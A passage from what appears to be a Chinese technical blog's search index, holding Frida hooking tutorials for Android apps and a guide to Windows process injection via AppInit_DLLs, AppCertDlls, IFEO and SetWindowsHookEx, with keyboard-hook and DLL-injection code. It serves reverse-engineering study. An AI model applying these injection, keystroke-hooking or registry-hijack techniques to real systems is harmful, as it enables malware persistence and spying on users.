\", symbol.address, symbol.name); hook_RegisterNatives(addrRegisterNatives) } } } function hook_RegisterNatives(addrRegisterNatives) { if (addrRegisterNatives != null) { Interceptor.attach(addrRegisterNatives, { onEnter: function (args) { console.log(\"[RegisterNatives] method_count:\", args[3]); var env = args[0]; var java_class = args[1]; var class_name = Java.vm.tryGetEnv().getClassName(java_class); //console.log(class_name); var methods_ptr = ptr(args[2]); var method_count = parseInt(args[3]); for (var i = 0; i \u003c method_count; i++) { var name_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * 3)); var sig_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize)); var fnPtr_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize * 2)); var name = Memory.readCString(name_ptr); var sig = Memory.readCString(sig_ptr); var find_module = Process.findModuleByAddress(fnPtr_ptr); console.log(\"[RegisterNatives] java_class:\", class_name, \"name:\", name, \"sig:\", sig, \"fnPtr:\", fnPtr_ptr, \" fnOffset:\", ptr(fnPtr_ptr).sub(find_module.base), \" callee:\", DebugSymbol.fromAddress(this.returnAddress)); } } }); } } setImmediate(find_RegisterNatives); ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:3:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"Nop掉Native函数 ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:4:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"测试Apk //Java层 package com.example.luonative; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.widget.TextView; import com.example.luonative.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luonative' library on application startup. static { System.loadLibrary(\"luonative\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); } public native String stringFromJNI(); } //Native层 #include \u003cjni.h\u003e #include \u003cstring\u003e extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luonative_MainActivity_stringFromJNI( JNIEnv *env, jobject thiz) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:4:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"Hook代码 本次示例 Nop掉stringFromJNI函数. function hook_dlopen() { Interceptor.attach(Module.findExportByName(null, \"dlopen\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"dlopen:\", path); } }, onLeave: function (retval) { } }) Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"android_dlopen_ext:\", path); this.path = path; } }, onLeave: function (retval) { if (this.path.indexOf(\"libluonative\") \u003e= 0) { var addr = Module.getExportByName(\"libluonative.so\", \"Java_com_example_luonative_MainActivity_stringFromJNI\") //错误示例 Nop // Interceptor.attach(addr, { // onEnter: function (args) { // return // }, // onLeave: function (retval) { // } // }) //正确示例 Nop Interceptor.replace(addr, new NativeCallback(function () { return 0; }, 'int', [])); } } }); } setImmediate(hook_dlopen); ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:4:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"Frida结合自定义Rom ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:5:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"GetDexFile ArtMethod类中有一个很好用的函数GetDexFile(),但很遗憾它是inline函数,并没有导出.但我们可以编译Android源码,在art_method-inl.h中添加一个导出函数myGetDexFile(),最后在libart.so中可以找到我们导出的函数. http://androidxref.com/8.1.0_r33/xref/art/runtime/art_method.cc http://androidxref.com/8.1.0_r33/xref/art/runtime/art_method-inl.h AndroidStudio新建一个工程,用IDA打开libart.so找到我们导出的函数,将相关代码移植到我们新建的工程中,编译,生成我们自己的so文件(也可以不自己生成so,用Frida直接加载Android源码编译后的libart.so).最后可以用Frida加载我们自己写的so,调用其中的导出函数. 这样的示例,可以参考寒冰大佬的Frida-Fart. ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:5:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"跟踪解释模式下的所有方法 运行在解释模式下的函数,是一定会过解释器的,所以我们要看Android源码中解释器部分的源码. http://androidxref.com/8.1.0_r33/xref/art/runtime/interpreter/interpreter.cc 在Execute函数中进行插桩,只要拿到ArtMethod*指针,就可以输出函数名. static inline JValue Execute( Thread* self, const DexFile::CodeItem* code_item, ShadowFrame\u0026 shadow_frame, JValue result_register, bool stay_in_interpreter = false){ //--------------------------- ArtMethod *method = shadow_frame.GetMethod(); LOG(ERROR)\u003c\u003cmethod-\u003ePrettyMethod().c_str(); if(strstr(method-\u003ePrettyMethod().c_str(),\"mytrace\")) return JValue(); //--------------------------- } 编译上述Android源码,通过以下JavaScript代码即可输出apk中解释模式下的所有方法. function main() { //Execute函数是inline函数,无法直接Hook,但在上面我们插入了strstr这个函数,故我们通过Hook libc.so中的strstr函数来输出函数名 var strstr = Module.findExportByName(\"libc.so\", \"strstr\"); Interceptor.attach(strstr, { onEnter: function (arg) { if (ptr(arg[1]).readCString().indexOf(\"mytrace\") \u003e= 0) { console.log(ptr(arg[0]).readCString()); } } }) } setImmediate(main); ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:5:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"Hook壳 壳一般会替换app的入口Application,我们Hook壳的Application类中的onCreate()函数,等待其执行完成,获取ClassLoader,进而进行Hook. ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:6:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"测试Apk 皮皮虾.apk ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:6:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"Hook代码 function getclassload() { var activityobj = Java.use(\"android.app.ActivityThread\").currentActivityThread(); var mInitialApplication = activityobj.mInitialApplication.value; var mLoadedApk = mInitialApplication.mLoadedApk.value; var mClassLoader = mLoadedApk.mClassLoader.value; return mClassLoader; } function main() { Java.perform(function () { var myshellclass = Java.use(\"com.sup.android.superb.MyWrapperProxyApplication\"); myshellclass.onCreate.implementation = function () { var result = this.onCreate(); var loader = getclassload(); //切ClassLoader // Java.classFactory.loader=loader; var myclass = Java.use(\"com.sup.android.superb.SplashActivity\"); myclass.onCreate.implementation = function (arg) { console.log(\"i am from SplashActivity onCreate\"); return this.onCreate(arg); } console.log(myclass); return result; } }) } setImmediate(main()) ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:6:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"Hook插件Dex ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:7:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"测试Dex package com.example.dexplugin; import android.util.Log; public class MyDex { public static String LuoTst() { Log.d(\"LuoHun\", \"com.example.dexplugin.MyDex.LuoTst\"); return \"Hello MyDex!\"; } } ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:7:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"测试Apk package com.example.loaddex; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.os.strictmode.WebViewMethodCalledOnWrongThreadViolation; import android.util.Log; import android.view.View; import android.widget.Button; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import dalvik.system.DexClassLoader; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); DexClassLoader dexLoader = new DexClassLoader(\"/data/local/tmp/mydex.dex\", \"/sdcard\", \"sdcard\", MainActivity.class.getClassLoader()); Button btn = findViewById(R.id.button); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View view) { try { Class myDexCls = dexLoader.loadClass(\"com.example.dexplugin.MyDex\"); /* Method LuoTst = myDexCls.getDeclaredMethod(\"LuoTst\"); LuoTst.setAccessible(true);*/ Method[] myMethods = myDexCls.getDeclaredMethods(); for (Method n : myMethods) { if (n.getName().indexOf(\"LuoTst\") \u003e= 0) { n.setAccessible(true); String str = (String) n.invoke(null); Log.d(\"loaddex\", str); } } } catch (ClassNotFoundException e) { e.printStackTrace(); } catch (IllegalAccessException | InvocationTargetException e) { e.printStackTrace(); } } }); } } ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:7:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"Hook代码 function func1() { //通过分析apk,可知ClassLoader用的的DexClassLoader //我们通过Hook DexClassLoader的构造函数,拿ClassLoader var dexclasloader = Java.use(\"dalvik.system.DexClassLoader\"); dexclasloader.$init.implementation = function (a, b, c, d) { var res = this.$init(a, b, c, d); //切ClassLoader Java.classFactory.loader = this; var myclass = Java.use(\"com.example.dexplugin.MyDex\"); myclass.LuoTst.implementation = function () { var res = this.LuoTst(); console.log(res) return \"LuoTst Hook\"; } } } function func2() { Java.enumerateClassLoaders({ onMatch: function (loader) { try { if (loader.findClass(\"com.example.dexplugin.MyDex\")) { //切ClassLoader Java.classFactory.loader = loader; } } catch (e) { } }, onComplete: function() { console.log(\"enum completed!\") } }) var myclass = Java.use(\"com.example.dexplugin.MyDex\"); myclass.LuoTst.implementation = function () { var res = this.LuoTst(); console.log(res) return \"LuoTst Hook\"; } } function func3() { Java.choose(\"dalvik.system.DexClassLoader\", { onMatch: function (loader) { try { //切ClassLoader Java.classFactory.loader = loader; var myclass = Java.use(\"com.example.dexplugin.MyDex\"); myclass.LuoTst.implementation = function () { var res = this.LuoTst(); console.log(res) return \"LuoTst Hook\"; } } catch (e) { } }, onComplete: function () { } }) } function main() { Java.perform(function () { //方案一,spawn方式 //func1() //方案二,不稳 //func2() //方案三,attach方式 func3() }) } setImmediate(main()) ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:7:3","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"Frida\u0026JNI 这里主要展示下native层如何调用java层,以及frida Hook libart.so中的导出函数. ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:8:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"测试Apk //Java层 package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; import java.util.Arrays; public class MainActivity extends AppCompatActivity { private static final String TAG = \"LuoHun\"; // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); } public native String stringFromJNI(); public static void func1(){ mystaticstr=\"myfunc1\"; Log.e(TAG,\"i am from my func1\"); } public static int func2(int a){ mystaticstr=\"myfunc2\"; Log.e(TAG,\"i am from my func2\"); return a; } public static String func3(String a){ mystaticstr=\"func3\"; Log.e(TAG,a); return a; } public static byte[] func4(byte[] a){ mystaticstr=\"func4\"; Log.e(TAG, Arrays.toString(a)); return a; } static String mystaticstr; } //Native层 #include \u003cjni.h\u003e #include \u003cstring\u003e #include \"android/log.h\" extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luodst_MainActivity_stringFromJNI( JNIEnv *env, jobject /* this */) { std::string hello = \"Hello from C++\"; jclass clsMainActivity = env-\u003eFindClass(\"com/example/luodst/MainActivity\"); jmethodID myfun1 = env-\u003eGetStaticMethodID(clsMainActivity, \"func1\", \"()V\"); env-\u003eCallStaticVoidMethod(clsMainActivity, myfun1); jmethodID myfun2 = env-\u003eGetStaticMethodID(clsMainActivity, \"func2\", \"(I)I\"); jint myfun2re = env-\u003eCallStaticIntMethod(clsMainActivity, myfun2, 58); __android_log_print(6, \"LuoHun\", \"%d\", myfun2re); jmethodID myfun3 = env-\u003eGetStaticMethodID(clsMainActivity, \"func3\", \"(Ljava/lang/String;)Ljava/lang/String;\"); jstring mystr = env-\u003eNewStringUTF(\"1231321321\"); jobject myfun3re = env-\u003eCallStaticObjectMethod(clsMainActivity, myfun3, mystr); const char *myreturn = env-\u003eGetStringUTFChars(static_cast\u003cjstring\u003e(myfun3re), 0); __android_log_print(6, \"LuoHun\", \"%s\", myreturn); jmethodID myfun4 = env-\u003eGetStaticMethodID(clsMainActivity, \"func4\", \"([B)[B\"); jbyte mybytearray[5] = {0x11, 0x12, 0x13, 0x14, 0x15}; jbyteArray mybytearrt = env-\u003eNewByteArray(sizeof(mybytearray) / sizeof(jbyte)); env-\u003eSetByteArrayRegion(mybytearrt, 0, sizeof(mybytearray) / sizeof(jbyte), mybytearray); jbyteArray myfun4ret = static_cast\u003cjbyteArray\u003e(env-\u003eCallStaticObjectMethod(clsMainActivity, myfun4, mybytearrt)); jbyte *mylog = env-\u003eGetByteArrayElements(myfun4ret, 0); for (int i = 0; i \u003c env-\u003eGetArrayLength(myfun4ret); i++) __android_log_print(6, \"LuoHun\", \"%x\", *(mylog + i)); jfieldID myfiled = env-\u003eGetStaticFieldID(clsMainActivity, \"mystaticstr\", \"Ljava/lang/String;\"); jstring mystaticstr = static_cast\u003cjstring\u003e(env-\u003eGetStaticObjectField(clsMainActivity, myfiled)); __android_log_print(6, \"LuoHun\", \"%s\", env-\u003eGetStringUTFChars(mystaticstr, 0)); return env-\u003eNewStringUTF(hello.c_str()); } ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:8:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"Hook代码 这里主要展示了如何打印Native层的class,char*以及jbyteArray. function main() { var libart = Module.enumerateSymbols(\"libart.so\"); var findclass = null; var GetStaticMethodID = null; var NewStringUTF = null; var GetStringUTFChars = null; var GetByteArrayElements = null; var GetStaticFieldID = null; var Callstaticmethid = null; var CallStaticObjectMethod = null; for (var i = 0; i \u003c libart.length; i++) { //console.log(libart[i].name) var symbol = libart[i]; if (symbol.name.indexOf(\"art\") \u003e= 0 \u0026\u0026 symbol.name.indexOf(\"JNI\") \u003e= 0 \u0026\u0026 symbol.name.indexOf(\"CheckJNI\") \u003c 0) { if (symbol.name.indexOf(\"art3JNI9FindClassEP7_JNIEnvP\") \u003e= 0) { //console.log(libart[i].name, libart[i].address) findclass = libart[i].address } if (symbol.name.indexOf(\"N3art3JNI17GetStaticMethodIDEP7_JNIEnvP7_jc\") \u003e= 0) { //console.log(libart[i].name, libart[i].address) GetStaticMethodID = libart[i].address } if (symbol.name.indexOf(\"rt3JNI12NewStringUTFEP\") \u003e= 0) { //console.log(libart[i].name, libart[i].address) NewStringUTF = libart[i].address } if (symbol.name.indexOf(\"rt3JNI17GetStringUTFChar\") \u003e= 0) { //console.log(libart[i].name, libart[i].address) GetStringUTFChars = libart[i].address } if (symbol.name.indexOf(\"NI20GetByteArrayElementsEP\") \u003e= 0) { console.log(libart[i].name, libart[i].address) GetByteArrayElements = libart[i].address } if (symbol.name.indexOf(\"NI16GetStaticFieldIDEP\") \u003e= 0) { //console.log(libart[i].name, libart[i].address) GetStaticFieldID = libart[i].address } } } // Interceptor.attach(findclass, { // onEnter: function (arg) { // console.log(\"FindClass: \" + ptr(arg[1]).readCString()); // }, // onLeave: function (retval) {} // }) Interceptor.attach(GetStaticMethodID, { onEnter: function (arg) { //打印class var myclass = Java.use(\"java.lang.Class\"); var ret = Java.cast(arg[1], myclass); //console.log(arg[1]) console.log(ret) //打印字符串 console.log(\"GetStaticMethodID: \" + ptr(arg[2]).readCString()) }, onLeave: function (retval) {} }) Interceptor.attach(GetByteArrayElements, { onEnter: function (args) { }, onLeave: function (retval) { console.log(\"GetByteArrayElements:\\n\" + hexdump(retval)) } }) } setImmediate(main); ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:8:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"Frida主动调用 这里主要展示frida如何主动调用Native层函数. ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:9:0","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"测试Apk //Java层 package com.example.luonative; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.widget.TextView; import com.example.luonative.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luonative' library on application startup. static { System.loadLibrary(\"luonative\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); } /** * A native method that is implemented by the 'luonative' native library, * which is packaged with this application. */ public native String stringFromJNI(); } //Native层 #include \u003cjni.h\u003e #include \u003cstring\u003e #include \u003candroid/log.h\u003e #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, \"LuoHun\", __VA_ARGS__); #define LOGW(...) __android_log_print(ANDROID_LOG_WARN, \"LuoHun\", __VA_ARGS__); #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, \"LuoHun\", __VA_ARGS__); extern \"C\" { int myFunc1(int n) { LOGE(\"myFunc1 %d\\n\", n); return n; } const char *myFunc2(const char *szBuffer) { LOGE(\"myFunc2 %s\\n\", szBuffer); return szBuffer; } jbyte* myFunc3(jbyte* b) { LOGE(\"myFunc3 %p\\n\", b); return b; } } extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luonative_MainActivity_stringFromJNI( JNIEnv *env, jobject /* this */) { std::string hello = \"Hello from C++\"; return env-\u003eNewStringUTF(hello.c_str()); } ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:9:1","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Android Frida"],"content":"Hook代码 function hook_dlopen() { Interceptor.attach(Module.findExportByName(null, \"dlopen\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"dlopen:\", path); } }, onLeave: function (retval) { } }) Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), { onEnter: function (args) { var pathptr = args[0]; if (pathptr !== undefined \u0026\u0026 pathptr != null) { var path = ptr(pathptr).readCString(); //console.log(\"android_dlopen_ext:\", path); if (path.indexOf(\"libluonative.so\") \u003e= 0) { this.target = true; console.log(\"found [android_dlopen_ext:]\", path); } } }, onLeave: function (retval) { if (this.target) { var func1 = Module.findExportByName(\"libluonative.so\", \"myFunc1\"); func1 = new NativeFunction(func1, 'int', ['int']); console.log(func1(1)); var func2 = Module.findExportByName(\"libluonative.so\", \"myFunc2\"); func2 = new NativeFunction(func2, 'pointer', ['pointer']); var mystr = Memory.alloc(100).writeUtf8String(\"func2 xxxxxxx\"); console.log(func2(mystr).readCString()); var func3 = Module.findExportByName(\"libluonative.so\", \"myFunc3\"); func3 = new NativeFunction(func3, 'pointer', ['pointer']); var b = [0x81, 0x99, 0xff, 0x7d]; mystr = Memory.alloc(100).writeByteArray(b); console.log(hexdump(func3(mystr))); } } }); } setImmediate(hook_dlopen); ","date":"2022-03-27","objectID":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/:9:2","tags":["Frida"],"title":"Frida Hook大全","uri":"/posts/android/android-hook/frida/frida-hook%E5%A4%A7%E5%85%A8/"},{"categories":["Win相关"],"content":"注册表 ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:1:0","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"AppInit_DLLs HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs 当User32.dll被映射到一个新的进程时,会收到DLL_PROCESS_ATTACH通知,当User32.dll对它进行处理的时候,会取得上述注册表键的值,并调用LoadLibary来载入这个字符串中指定的每个DLL. AppInit_Dlls:该键的值可能会包含一个DLL的文件名或一组DLL的文件名(通过空格或逗号分隔)(由于空格是用来分隔文件名的,所以我们必须避免在文件名中包含空格).第一个DLL的文件名可以包含路径,但其他DLL包含的路径则会被忽略,出于这个原因,我们最好是将自己的DLL放到windows的系统目录中,这样就不必指定路径了. User32.dll是一个非常常见的库,用于存储对话框等图形元素.因此,当恶意软件修改此子键时,大多数进程将加载恶意库. 注意 在win7之后,windows对dll加载的安全性增加了控制. LoadAppInit_DLLs为1开启,为0关闭. RequireSignedAppInit_DLLs值为1表明模块需要签名才能加载. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:1:1","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"AppCertDlls HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls 此注册表项下的DLL被加载到调用Win32 API函数CreateProcess,CreateProcessAsUser,CreateProcessWithLogonW,CreateProcessWithTokenW和WinExec的每个进程中. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:1:2","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"映像文件执行选项(IFEO) HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options IFEO通常用于调试目的.开发人员可以在此注册表项下设置\"调试器值\",以将程序附加到另一个可执行文件以进行调试. 如上图中新建了一个LuoDst.exe项,又添加了Debugger项.这样的话,当我们运行LuoDst.exe实际上运行的是Debugger项中的程序. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:1:3","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"SetWindowsHookEx 钩子实际上是一个处理消息的程序段,通过系统调用,把它挂入系统.每当特定的消息发出,在没有到达目的窗口前,钩子程序就先捕获该消息,亦即钩子函数先得到控制权. 注意 钩子无法更改具体消息携带的数据,只能做监视使用 ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:2:0","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"局部钩子 HHOOK g_hHook; LRESULT CALLBACK MyKeyboardProc(int code,// hook code WPARAM wParam, // virtual-key code LPARAM lParam // keystroke-message information ) { //MSDN说明,如果code \u003c 0,必须返回,CallNextHookEx的返回值 if (code \u003c 0) { return CallNextHookEx(g_hHook, code, wParam, lParam); } CString csFmt; csFmt.Format(\"Hook：%c \", wParam); OutputDebugString(csFmt); //把消息传递给下一个钩子 return CallNextHookEx(g_hHook, code, wParam, lParam); } //设置局部钩子 g_hHook = ::SetWindowsHookEx( WH_KEYBOARD, //键盘钩子 MyKeyboardProc, //钩子回调函数 NULL, //局部钩子,填NULL;全局钩子,填DLL的模块句柄 GetCurrentThreadId() //钩本线程的窗口;填NULL则勾所有窗口线程 ); ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:2:1","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"全局钩子 钩子回调函数必须写在Dll中. DLL: extern \"C\" __declspec(dllimport) LRESULT MyMessageProcess(int Code, WPARAM wParam, LPARAM lParam); extern \"C\" __declspec(dllexport) LRESULT MyMessageProcess(int Code, WPARAM wParam, LPARAM lParam) { ::MessageBox(NULL, \"Inject Success\", \"LuoDll\", MB_OK); return 0; } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: { } case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 设置钩子: void CLuoDstDlg::OnBnClickedInject() { //获取被注入进程名 char szInjectProcess[MAX_PATH] = {}; GetDlgItemText(EDT_INJECTNAME, szInjectProcess, MAX_PATH); DWORD dwProcessId = GetPIdByProcessName(szInjectProcess); //获取注入的DLL char szDllName[MAX_PATH] = { 0 }; GetDlgItemText(EDT_INJECTDLL, szDllName, MAX_PATH); BOOL bRet = InjectDllBySetWindowsHook((ULONG32)dwProcessId, szDllName); if (bRet) { MessageBox(\"注入成功\"); } } void CLuoDstDlg::OnBnClickedExit() { if (m_hHook) { UnhookWindowsHookEx(m_hHook); m_hHook = NULL; } if (m_hmDll) { FreeLibrary(m_hmDll); m_hmDll = NULL; } } BOOL CLuoDstDlg::InjectDllBySetWindowsHook(ULONG32 ulTargetProcessID, char* pszDllName) { m_hmDll = LoadLibrary(pszDllName); if (NULL == m_hmDll) { MessageBox(\"LoadLibraryError!\"); return FALSE; } HOOKPROC sub_address = NULL; sub_address = (HOOKPROC)GetProcAddress(m_hmDll, \"MyMessageProcess\"); if (NULL == sub_address) { MessageBox(\"GetProcAddressError!\"); return FALSE; } DWORD dwThreadID = GetThreadID(ulTargetProcessID); /* 